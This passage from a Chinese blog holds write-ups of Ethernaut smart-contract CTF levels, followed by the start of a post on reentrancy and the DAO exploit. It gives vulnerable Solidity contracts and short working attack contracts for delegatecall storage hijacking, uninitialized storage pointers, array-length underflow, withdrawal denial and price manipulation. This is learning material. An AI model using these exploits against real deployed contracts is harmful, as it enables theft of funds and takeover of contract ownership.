&#123;</span><br><span class="line">     token.init(INITIAL_SUPPLY);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function">function <span class="title">totalSupply</span><span class="params">()</span> view <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> token.totalSupply;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function">function <span class="title">balanceOf</span><span class="params">(address who)</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> token.balanceOf(who);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function">function <span class="title">allowance</span><span class="params">(address owner, address spender)</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> token.allowance(owner, spender);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function">function <span class="title">transfer</span><span class="params">(address to, uint value)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bool ok)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> token.transfer(to, value);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function">function <span class="title">transferFrom</span><span class="params">(address from, address to, uint value)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bool ok)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> token.transferFrom(from, to, value);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function">function <span class="title">approve</span><span class="params">(address spender, uint value)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bool ok)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> token.approve(spender, value);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function">event <span class="title">Transfer</span><span class="params">(address indexed from, address indexed to, uint value)</span></span>;</span><br><span class="line">   <span class="function">event <span class="title">Approval</span><span class="params">(address indexed owner, address indexed spender, uint value)</span></span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">contract NaughtCoin is StandardToken &#123;</span><br><span class="line"></span><br><span class="line">    string <span class="keyword">public</span> constant name = <span class="string">'NaughtCoin'</span>;</span><br><span class="line">    string <span class="keyword">public</span> constant symbol = <span class="string">'0x0'</span>;</span><br><span class="line">    uint <span class="keyword">public</span> constant decimals = <span class="number">18</span>;</span><br><span class="line">    uint <span class="keyword">public</span> timeLock = now + <span class="number">10</span> years;</span><br><span class="line">    uint <span class="keyword">public</span> INITIAL_SUPPLY = <span class="number">1000000</span> * (<span class="number">10</span> ** decimals);</span><br><span class="line">    address <span class="keyword">public</span> player;</span><br><span class="line"></span><br><span class="line">    constructor(address _player) <span class="keyword">public</span> &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        totalSupply_ = INITIAL_SUPPLY;</span><br><span class="line">        balanceOf[player] = INITIAL_SUPPLY;</span><br><span class="line">        Transfer(<span class="number">0x0</span>, player, INITIAL_SUPPLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">transfer</span><span class="params">(address _to, uint256 _value)</span> lockTokens <span class="keyword">public</span> <span class="title">returns</span><span class="params">(bool)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.transfer(_to, _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span></span><br><span class="line">    <span class="function">modifier <span class="title">lockTokens</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (msg.sender == player) &#123;</span><br><span class="line">            require(now &gt; timeLock);</span><br><span class="line">            <span class="keyword">if</span> (now &lt; timeLock) &#123;</span><br><span class="line">                _;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            _;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x10-Preservation"><a href="#0x10-Preservation" class="headerlink" title="0x10 Preservation"></a>0x10 Preservation</h2><p>考点delegatecall。传地址字符串，坑坏我了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span>.0 &lt; <span class="number">0.6</span>.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// public library contracts </span></span><br><span class="line">  address <span class="keyword">public</span> timeZone1Library;</span><br><span class="line">  address <span class="keyword">public</span> timeZone2Library;</span><br><span class="line">  address <span class="keyword">public</span> owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  <span class="comment">// Sets the function signature for delegatecall</span></span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(<span class="string">"setTime(uint256)"</span>));</span><br><span class="line">  </span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) <span class="keyword">public</span> &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// set the time for timezone 1</span></span><br><span class="line">  <span class="function">function <span class="title">setFirstTime</span><span class="params">(uint _timeStamp)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the time for timezone 2</span></span><br><span class="line">  <span class="function">function <span class="title">setSecondTime</span><span class="params">(uint _timeStamp)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simple library contract to set the time</span></span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// stores a timestamp </span></span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">setTime</span><span class="params">(uint _time)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">  address <span class="keyword">public</span> timeZone1Library;</span><br><span class="line">  address <span class="keyword">public</span> timeZone2Library;</span><br><span class="line">  address <span class="keyword">public</span> owner;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">setTime</span><span class="params">(uint _time)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">      owner = <span class="number">0x0Ed04C1C495407d394C493587d4cB2474d0726a3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x11-Locked"><a href="#0x11-Locked" class="headerlink" title="0x11 Locked"></a>0x11 Locked</h2><p>考点是旧版struct默认是storage，它声明未初始化指针指向slot 0。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span>.23; </span><br><span class="line"></span><br><span class="line"><span class="comment">// A Locked Name Registrar</span></span><br><span class="line">contract Locked &#123;</span><br><span class="line"></span><br><span class="line">    bool <span class="keyword">public</span> unlocked = <span class="keyword">false</span>;  <span class="comment">// registrar locked, no name updates</span></span><br><span class="line"></span><br><span class="line">    struct NameRecord &#123; <span class="comment">// map hashes to addresses</span></span><br><span class="line">        bytes32 name; <span class="comment">// </span></span><br><span class="line">        address mappedAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; NameRecord) <span class="keyword">public</span> registeredNameRecord; <span class="comment">// records who registered names </span></span><br><span class="line">    mapping(bytes32 =&gt; address) <span class="keyword">public</span> resolve; <span class="comment">// resolves hashes to addresses</span></span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">register</span><span class="params">(bytes32 _name, address _mappedAddress)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// set up the new NameRecord</span></span><br><span class="line">        NameRecord newRecord;</span><br><span class="line">        newRecord.name = _name;</span><br><span class="line">        newRecord.mappedAddress = _mappedAddress; </span><br><span class="line"></span><br><span class="line">        resolve[_name] = _mappedAddress;</span><br><span class="line">        registeredNameRecord[msg.sender] = newRecord; </span><br><span class="line"></span><br><span class="line">        require(unlocked); <span class="comment">// only allow registrations if contract is unlocked</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    <span class="function">function <span class="title">hack</span><span class="params">(address param)</span></span>&#123;</span><br><span class="line">       Locked locked = Locked(param);</span><br><span class="line">       locked.register(bytes32(<span class="number">1</span>),address(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x12-Recovery"><a href="#0x12-Recovery" class="headerlink" title="0x12 Recovery"></a>0x12 Recovery</h2><p>此题考点合约地址的计算。</p>
<p><code>new_addr = address(keccak256(RLP([sender_address,nonce])))</code></p>
<p>nonce是1，sender_address是instance，RLP看文档用python跑一下。</p>
<p>也可能在ropsten上查。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span>.23;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//generate tokens</span></span><br><span class="line">  <span class="function">function <span class="title">generateToken</span><span class="params">(string _name, uint256 _initialSupply)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">new</span> SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// public variables</span></span><br><span class="line">  string <span class="keyword">public</span> name;</span><br><span class="line">  mapping (address =&gt; uint) <span class="keyword">public</span> balances;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// constructor</span></span><br><span class="line">  constructor(string _name, address _creator, uint256 _initialSupply) <span class="keyword">public</span> &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// collect ether in return for tokens</span></span><br><span class="line">  function() <span class="keyword">public</span> payable &#123;</span><br><span class="line">    balances[msg.sender] = msg.value*<span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// allow transfers of tokens</span></span><br><span class="line">  <span class="function">function <span class="title">transfer</span><span class="params">(address _to, uint _amount)</span> <span class="keyword">public</span> </span>&#123; </span><br><span class="line">    require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] -= _amount;</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// clean up after ourselves</span></span><br><span class="line">  <span class="function">function <span class="title">destroy</span><span class="params">(address _to)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x13-MagicNumber"><a href="#0x13-MagicNumber" class="headerlink" title="0x13 MagicNumber"></a>0x13 MagicNumber</h2><p>没看明白。</p>
<p><a href="https://www.jianshu.com/p/d9137e87c9d3" target="_blank" rel="noopener">一个新合约被创建后会发生什么</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address <span class="keyword">public</span> solver;</span><br><span class="line"></span><br><span class="line">  constructor() <span class="keyword">public</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">setSolver</span><span class="params">(address _solver)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    solver = _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ____________/\\\_______/\\\\\\\\\_____        </span></span><br><span class="line"><span class="comment">     __________/\\\\\_____/\\\///////\\\___       </span></span><br><span class="line"><span class="comment">      ________/\\\/\\\____\///______\//\\\__      </span></span><br><span class="line"><span class="comment">       ______/\\\/\/\\\______________/\\\/___     </span></span><br><span class="line"><span class="comment">        ____/\\\/__\/\\\___________/\\\//_____    </span></span><br><span class="line"><span class="comment">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span></span><br><span class="line"><span class="comment">          _\///////////\\\//____/\\\/___________  </span></span><br><span class="line"><span class="comment">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span></span><br><span class="line"><span class="comment">            ___________\///_____\///////////////__</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x14-Alien-Codex"><a href="#0x14-Alien-Codex" class="headerlink" title="0x14 Alien Codex"></a>0x14 Alien Codex</h2><p>这题是典型的下溢，通过使length下溢。<br>先要把contact设成true，看文档中<a href="https://solidity.readthedocs.io/en/v0.4.25/abi-spec.html#use-of-dynamic-types" target="_blank" rel="noopener">函数参数编码</a>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func=&quot;0x1d3d4c0b&quot;; // 函数 id</span><br><span class="line">data1=&quot;0000000000000000000000000000000000000000000000000000000000000020&quot;// 偏移</span><br><span class="line">data2=&quot;1000000000000000000000000000000000000000000000000000000000000001&quot;// 长度</span><br></pre></td></tr></table></figure>
<p>然后调retract()使length溢出。然后计算owner的位置，找到对应的codex[i]，修改，换成自己的地址。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span>.24;</span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line">  bool <span class="keyword">public</span> contact;</span><br><span class="line">  bytes32[] <span class="keyword">public</span> codex;</span><br><span class="line">  <span class="function">modifier <span class="title">contacted</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">assert</span>(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function">function <span class="title">make_contact</span><span class="params">(bytes32[] _firstContactMessage)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">assert</span>(_firstContactMessage.length &gt; <span class="number">2</span>**<span class="number">200</span>);</span><br><span class="line">    contact = <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function">function <span class="title">record</span><span class="params">(bytes32 _content)</span> contacted <span class="keyword">public</span> </span>&#123;</span><br><span class="line">  	codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function">function <span class="title">retract</span><span class="params">()</span> contacted <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function">function <span class="title">revise</span><span class="params">(uint i, bytes32 _content)</span> contacted <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="0x15-Denial"><a href="#0x15-Denial" class="headerlink" title="0x15 Denial"></a>0x15 Denial</h2><p>不让它的伙伴提钱，fallback抛异常，要使transfer失败，assert异常后会转走所有gas。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span>.24;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line"></span><br><span class="line">    address <span class="keyword">public</span> partner; <span class="comment">// withdrawal partner - pay the gas, split the withdraw</span></span><br><span class="line">    address <span class="keyword">public</span> constant owner = <span class="number">0xA9E</span>;</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(address =&gt; uint) withdrawPartnerBalances; <span class="comment">// keep track of partners balances</span></span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">setWithdrawPartner</span><span class="params">(address _partner)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// withdraw 1% to recipient and 1% to owner</span></span><br><span class="line">    <span class="function">function <span class="title">withdraw</span><span class="params">()</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        uint amountToSend = address(<span class="keyword">this</span>).balance/<span class="number">100</span>;</span><br><span class="line">        <span class="comment">// perform a call without checking return</span></span><br><span class="line">        <span class="comment">// The recipient can revert, the owner will still get their share</span></span><br><span class="line">        partner.call.value(amountToSend)();</span><br><span class="line">        owner.transfer(amountToSend);</span><br><span class="line">        <span class="comment">// keep track of last withdrawal time</span></span><br><span class="line">        timeLastWithdrawn = now;</span><br><span class="line">        withdrawPartnerBalances[partner] += amountToSend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allow deposit of funds</span></span><br><span class="line">    function() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// convenience function</span></span><br><span class="line">    <span class="function">function <span class="title">contractBalance</span><span class="params">()</span> view <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(<span class="keyword">this</span>).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line">    function() payable&#123;</span><br><span class="line">        <span class="keyword">assert</span>(<span class="number">0</span>==<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x16-Shop"><a href="#0x16-Shop" class="headerlink" title="0x16 Shop"></a>0x16 Shop</h2><p>像电梯一样，sao一下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span>.0 &lt; <span class="number">0.6</span>.0;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">  uint <span class="keyword">public</span> price = <span class="number">100</span>;</span><br><span class="line">  bool <span class="keyword">public</span> isSold;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">buy</span><span class="params">()</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_buyer.price.gas(<span class="number">3000</span>)() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = <span class="keyword">true</span>;</span><br><span class="line">      price = _buyer.price.gas(<span class="number">3000</span>)();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Buyer &#123;</span><br><span class="line">    <span class="function">function <span class="title">price</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Shop(msg.sender).isSold()==<span class="keyword">true</span>?<span class="number">0</span>:<span class="number">100</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">hack</span> <span class="params">(address param)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        Shop shop = Shop(param);</span><br><span class="line">        shop.buy();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/programming/">编程</a>
    </div>


      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Ethereum/">Ethereum</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-Ethereum-bug" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/03/18/Ethereum-bug/" class="article-date">
      <time datetime="2019-03-18T11:17:29.000Z" itemprop="datePublished">2019-03-18</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/18/Ethereum-bug/">以太坊漏洞 TOP9</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="top-1-Reentrancy"><a href="#top-1-Reentrancy" class="headerlink" title="top 1 Reentrancy"></a>top 1 Reentrancy</h1><h2 id="info"><a href="#info" class="headerlink" title="info"></a>info</h2><p><strong>重置资产放在转币操作后</strong></p>
<p>The DAO对此体会深刻。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="background"><a href="#background" class="headerlink" title="background"></a>background</h3><h4 id="fallback"><a href="#fallback" class="headerlink" title="fallback"></a>fallback</h4><p>fallback函数，回退函数，是合约里的特殊无名函数，有且仅有一个。它在合约调用没有匹配到函数签名，或者调用没有带任何数据时被自动调用。</p>
<h4 id="转币"><a href="#转币" class="headerlink" title="转币"></a>转币</h4><blockquote>
<ol>
<li><address>.transfer()    //失败抛出throw且回滚，2300gas</address></li>
<li><address>.send()    //失败返回false，2300gas</address></li>
<li><address>.gas().call.value()()    //失败返回false，所有gas</address></li>
</ol>
</blockquote>
<h3 id="重置资产放在转币操作后"><a href="#重置资产放在转币操作后" class="headerlink" title="重置资产放在转币操作后"></a>重置资产放在转币操作后</h3><p>所以就可以进行下面的操作了。</p>
<h4 id="attack-steps"><a href="#attack-steps" class="headerlink" title="attack steps:"></a>attack steps:</h4><blockquote>
<p>1.Propose a split and wait until the voting period expires. (DAO.sol, createProposal)</p>
</blockquote>
<blockquote>
<p>2.Execute the split. (DAO.sol, splitDAO)</p>
</blockquote>
<blockquote>
<p>3.Let the DAO send your new DAO its share of tokens. (splitDAO -&gt; TokenCreation.sol, createTokenProxy)</p>
</blockquote>
<blockquote>
<p>4.Make sure the DAO tries to send you a reward before it updates your balance but after doing (3). (splitDAO -&gt; withdrawRewardFor -&gt; ManagedAccount.sol, payOut)</p>
</blockquote>
<blockquote>
<p>5.While the DAO is doing (4), have it run splitDAO again with the same parameters as in (2) (payOut -&gt; _recipient.call.value -&gt; _recipient())</p>
</blockquote>
<blockquote>
<p>6.The DAO will now send you more child tokens, and go to withdraw your reward before updating your balance. (DAO.sol, splitDAO)</p>
</blockquote>
<blockquote>
<p>7.Back to (5)!</p>
</blockquote>
<blockquote>
<p>8.Let the DAO update your balance. Because (7) goes back to (5), it never actually will :-).</p>
</blockquote>
<p>其中最关键的就是第4步，payOut使用_recipient.call.value(_amount)()转币，而splitDAO函数中资产重置是放在withdrawRewardFor转币函数后，造成漏洞。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="漏洞合约"><a href="#漏洞合约" class="headerlink" title="漏洞合约"></a>漏洞合约</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract vulnerable_DAO&#123;</span><br><span class="line">    mapping(address=&gt;uint) userBalances;</span><br><span class="line">    <span class="function">function <span class="title">vulnerable_DAO</span><span class="params">()</span> payable </span>&#123;&#125;</span><br><span class="line">    <span class="function">function <span class="title">getUserBalance</span><span class="params">(address user)</span> constant <span class="title">returns</span><span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> 